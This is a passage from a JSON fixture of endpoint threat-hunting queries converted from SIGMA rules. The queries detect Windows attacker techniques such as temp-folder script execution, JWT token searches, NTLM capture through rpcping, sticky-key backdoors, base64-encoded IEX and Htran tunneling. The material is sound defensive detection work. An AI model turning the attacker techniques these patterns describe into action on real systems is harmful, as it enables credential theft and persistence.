            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 530
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects a suspicious script executions from temporary folder",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1059"
            ],
            "name": "Suspicious Script Execution From Temp Folder",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (((tgt.process.image.path contains \"\\powershell.exe\" or tgt.process.image.path contains \"\\pwsh.exe\" or tgt.process.image.path contains \"\\mshta.exe\" or tgt.process.image.path contains \"\\wscript.exe\" or tgt.process.image.path contains \"\\cscript.exe\") and (tgt.process.cmdline contains \"\\Windows\\Temp\" or tgt.process.cmdline contains \"\\Temporary Internet\" or tgt.process.cmdline contains \"\\AppData\\Local\\Temp\" or tgt.process.cmdline contains \"\\AppData\\Roaming\\Temp\" or tgt.process.cmdline contains \"%TEMP%\" or tgt.process.cmdline contains \"%TMP%\" or tgt.process.cmdline contains \"%LocalAppData%\\Temp\")) and (not (tgt.process.cmdline contains \" >\" or tgt.process.cmdline contains \"Out-File\" or tgt.process.cmdline contains \"ConvertTo-Json\" or tgt.process.cmdline contains \"-WindowStyle hidden -Verb runAs\" or tgt.process.cmdline contains \"\\Windows\\system32\\config\\systemprofile\\AppData\\Local\\Temp\\Amazon\\EC2-Windows\\\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 531
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects commands that temporarily turn off Volume Snapshots",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1562"
            ],
            "name": "Disabled Volume Snapshots",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"\\Services\\VSS\\Diag\" and tgt.process.cmdline contains \"/d Disabled\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 532
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects possible search for JWT tokens via CLI by looking for the string \"eyJ0eX\" or \"eyJhbG\".\nThis string is used as an anchor to look for the start of the JWT token used by microsoft office and similar apps.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1528"
            ],
            "name": "Potentially Suspicious JWT Token Search Via CLI",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"eyJ0eXAiOi\" or tgt.process.cmdline contains \"eyJhbGciOi\" or tgt.process.cmdline contains \" eyJ0eX\" or tgt.process.cmdline contains \" \\\"eyJ0eX\\\"\" or tgt.process.cmdline contains \" 'eyJ0eX'\" or tgt.process.cmdline contains \" eyJhbG\" or tgt.process.cmdline contains \" \\\"eyJhbG\\\"\" or tgt.process.cmdline contains \" 'eyJhbG'\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 533
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects MMC20.Application Lateral Movement; specifically looks for the spawning of the parent MMC.exe with a command line of \"-Embedding\" as a child of svchost.exe",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1021"
            ],
            "name": "MMC20 Lateral Movement",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (src.process.image.path contains \"\\svchost.exe\" and tgt.process.image.path contains \"\\mmc.exe\" and tgt.process.cmdline contains \"-Embedding\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 534
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the use of the 'Launch-VsDevShell.ps1' Microsoft signed script to execute commands.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1216"
            ],
            "name": "Launch-VsDevShell.PS1 Proxy Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"Launch-VsDevShell.ps1\" and (tgt.process.cmdline contains \"VsWherePath \" or tgt.process.cmdline contains \"VsInstallationPath \")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 535
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Monitors for the hiding possible malicious files in the C:\\Windows\\Fonts\\ location. This folder doesn't require admin privillege to be written and executed from.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1211",
                "t1059"
            ],
            "name": "Writing Of Malicious Files To The Fonts Folder",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.cmdline contains \"echo\" or tgt.process.cmdline contains \"copy\" or tgt.process.cmdline contains \"type\" or tgt.process.cmdline contains \"file createnew\" or tgt.process.cmdline contains \"cacls\") and tgt.process.cmdline contains \"C:\\Windows\\Fonts\\\" and (tgt.process.cmdline contains \".sh\" or tgt.process.cmdline contains \".exe\" or tgt.process.cmdline contains \".dll\" or tgt.process.cmdline contains \".bin\" or tgt.process.cmdline contains \".bat\" or tgt.process.cmdline contains \".cmd\" or tgt.process.cmdline contains \".js\" or tgt.process.cmdline contains \".msh\" or tgt.process.cmdline contains \".reg\" or tgt.process.cmdline contains \".scr\" or tgt.process.cmdline contains \".ps\" or tgt.process.cmdline contains \".vb\" or tgt.process.cmdline contains \".jar\" or tgt.process.cmdline contains \".pl\" or tgt.process.cmdline contains \".inf\" or tgt.process.cmdline contains \".cpl\" or tgt.process.cmdline contains \".hta\" or tgt.process.cmdline contains \".msi\" or tgt.process.cmdline contains \".vbs\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 536
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the execution of malicious OneNote documents that contain embedded scripts.\nWhen a user clicks on a OneNote attachment and then on the malicious link inside the \".one\" file, it exports and executes the malicious embedded script from specific directories.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1218"
            ],
            "name": "OneNote.EXE Execution of Malicious Embedded Scripts",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (src.process.image.path contains \"\\onenote.exe\" and (tgt.process.image.path contains \"\\cmd.exe\" or tgt.process.image.path contains \"\\cscript.exe\" or tgt.process.image.path contains \"\\mshta.exe\" or tgt.process.image.path contains \"\\powershell.exe\" or tgt.process.image.path contains \"\\pwsh.exe\" or tgt.process.image.path contains \"\\wscript.exe\") and (tgt.process.cmdline contains \"\\exported\\\" or tgt.process.cmdline contains \"\\onenoteofflinecache_files\\\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 537
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects using Rpcping.exe to send a RPC test connection to the target server (-s) and force the NTLM hash to be sent in the process.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1003"
            ],
            "name": "Capture Credentials with Rpcping.exe",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\rpcping.exe\" and (tgt.process.cmdline contains \"-s\" or tgt.process.cmdline contains \"/s\" or tgt.process.cmdline contains \"\u2013s\" or tgt.process.cmdline contains \"\u2014s\" or tgt.process.cmdline contains \"\u2015s\") and (((tgt.process.cmdline contains \"-u\" or tgt.process.cmdline contains \"/u\" or tgt.process.cmdline contains \"\u2013u\" or tgt.process.cmdline contains \"\u2014u\" or tgt.process.cmdline contains \"\u2015u\") and (tgt.process.cmdline contains \"NTLM\")) or ((tgt.process.cmdline contains \"-t\" or tgt.process.cmdline contains \"/t\" or tgt.process.cmdline contains \"\u2013t\" or tgt.process.cmdline contains \"\u2014t\" or tgt.process.cmdline contains \"\u2015t\") and (tgt.process.cmdline contains \"ncacn_np\")))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 538
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects TOKEN OBFUSCATION technique from Invoke-Obfuscation",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1027"
            ],
            "name": "Powershell Token Obfuscation - Process Creation",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.cmdline matches \"\\\\w+`(\\\\w+|-|.)`[\\\\w+|\\\\s]\" or tgt.process.cmdline matches \"\"(\\\\{\\\\d\\\\})+\"\\\\s*-f\" or tgt.process.cmdline matches \"(?i)\\\\$\\\\{`?e`?n`?v`?:`?p`?a`?t`?h`?\\\\}\") and (not tgt.process.cmdline contains \"${env:path}\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 539
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects execution of Chromium based browser in headless mode",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1105"
            ],
            "name": "Browser Execution In Headless Mode",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \"\\brave.exe\" or tgt.process.image.path contains \"\\chrome.exe\" or tgt.process.image.path contains \"\\msedge.exe\" or tgt.process.image.path contains \"\\opera.exe\" or tgt.process.image.path contains \"\\vivaldi.exe\") and tgt.process.cmdline contains \"--headless\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 540
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detect usage of the \"ssh.exe\" binary as a proxy to launch other programs.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1218"
            ],
            "name": "Program Executed Using Proxy/Local Command Via SSH.EXE",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (src.process.image.path=\"C:\\Windows\\System32\\OpenSSH\\sshd.exe\" or (tgt.process.image.path contains \"\\ssh.exe\" and (tgt.process.cmdline contains \"ProxyCommand=\" or (tgt.process.cmdline contains \"PermitLocalCommand\" and tgt.process.cmdline contains \"LocalCommand\")))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 541
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the usage and installation of a backdoor that uses an option to register a malicious debugger for built-in tools that are accessible in the login screen",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1546"
            ],
            "name": "Sticky Key Like Backdoor Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (src.process.image.path contains \"\\winlogon.exe\" and (tgt.process.image.path contains \"\\cmd.exe\" or tgt.process.image.path contains \"\\cscript.exe\" or tgt.process.image.path contains \"\\mshta.exe\" or tgt.process.image.path contains \"\\powershell.exe\" or tgt.process.image.path contains \"\\pwsh.exe\" or tgt.process.image.path contains \"\\regsvr32.exe\" or tgt.process.image.path contains \"\\rundll32.exe\" or tgt.process.image.path contains \"\\wscript.exe\" or tgt.process.image.path contains \"\\wt.exe\") and (tgt.process.cmdline contains \"sethc.exe\" or tgt.process.cmdline contains \"utilman.exe\" or tgt.process.cmdline contains \"osk.exe\" or tgt.process.cmdline contains \"Magnify.exe\" or tgt.process.cmdline contains \"Narrator.exe\" or tgt.process.cmdline contains \"DisplaySwitch.exe\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 542
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects usage of a base64 encoded \"IEX\" cmdlet in a process command line",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1059"
            ],
            "name": "PowerShell Base64 Encoded IEX Cmdlet",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.cmdline contains \"SUVYIChb\" or tgt.process.cmdline contains \"lFWCAoW\" or tgt.process.cmdline contains \"JRVggKF\" or tgt.process.cmdline contains \"aWV4IChb\" or tgt.process.cmdline contains \"lleCAoW\" or tgt.process.cmdline contains \"pZXggKF\" or tgt.process.cmdline contains \"aWV4IChOZX\" or tgt.process.cmdline contains \"lleCAoTmV3\" or tgt.process.cmdline contains \"pZXggKE5ld\" or tgt.process.cmdline contains \"SUVYIChOZX\" or tgt.process.cmdline contains \"lFWCAoTmV3\" or tgt.process.cmdline contains \"JRVggKE5ld\" or tgt.process.cmdline contains \"SUVYKF\" or tgt.process.cmdline contains \"lFWChb\" or tgt.process.cmdline contains \"JRVgoW\" or tgt.process.cmdline contains \"aWV4KF\" or tgt.process.cmdline contains \"lleChb\" or tgt.process.cmdline contains \"pZXgoW\" or tgt.process.cmdline contains \"aWV4KE5ld\" or tgt.process.cmdline contains \"lleChOZX\" or tgt.process.cmdline contains \"pZXgoTmV3\" or tgt.process.cmdline contains \"SUVYKE5ld\" or tgt.process.cmdline contains \"lFWChOZX\" or tgt.process.cmdline contains \"JRVgoTmV3\" or tgt.process.cmdline contains \"SUVYKCgn\" or tgt.process.cmdline contains \"lFWCgoJ\" or tgt.process.cmdline contains \"JRVgoKC\" or tgt.process.cmdline contains \"aWV4KCgn\" or tgt.process.cmdline contains \"lleCgoJ\" or tgt.process.cmdline contains \"pZXgoKC\") or (tgt.process.cmdline contains \"SQBFAFgAIAAoAFsA\" or tgt.process.cmdline contains \"kARQBYACAAKABbA\" or tgt.process.cmdline contains \"JAEUAWAAgACgAWw\" or tgt.process.cmdline contains \"aQBlAHgAIAAoAFsA\" or tgt.process.cmdline contains \"kAZQB4ACAAKABbA\" or tgt.process.cmdline contains \"pAGUAeAAgACgAWw\" or tgt.process.cmdline contains \"aQBlAHgAIAAoAE4AZQB3A\" or tgt.process.cmdline contains \"kAZQB4ACAAKABOAGUAdw\" or tgt.process.cmdline contains \"pAGUAeAAgACgATgBlAHcA\" or tgt.process.cmdline contains \"SQBFAFgAIAAoAE4AZQB3A\" or tgt.process.cmdline contains \"kARQBYACAAKABOAGUAdw\" or tgt.process.cmdline contains \"JAEUAWAAgACgATgBlAHcA\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 543
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects executable names or flags used by Htran or Htran-like tools (e.g. NATBypass)",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1090"
            ],
            "name": "HackTool - Htran/NATBypass Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \"\\htran.exe\" or tgt.process.image.path contains \"\\lcx.exe\") or (tgt.process.cmdline contains \".exe -tran \" or tgt.process.cmdline contains \".exe -slave \")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 544
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the presence of the keywords \"Wscript\", \"Shell\" and \"Run\" in the command, which could indicate a suspicious activity",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1059"
            ],
            "name": "Wscript Shell Run In CommandLine",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"Wscript.\" and tgt.process.cmdline contains \".Shell\" and tgt.process.cmdline contains \".Run\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 545
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
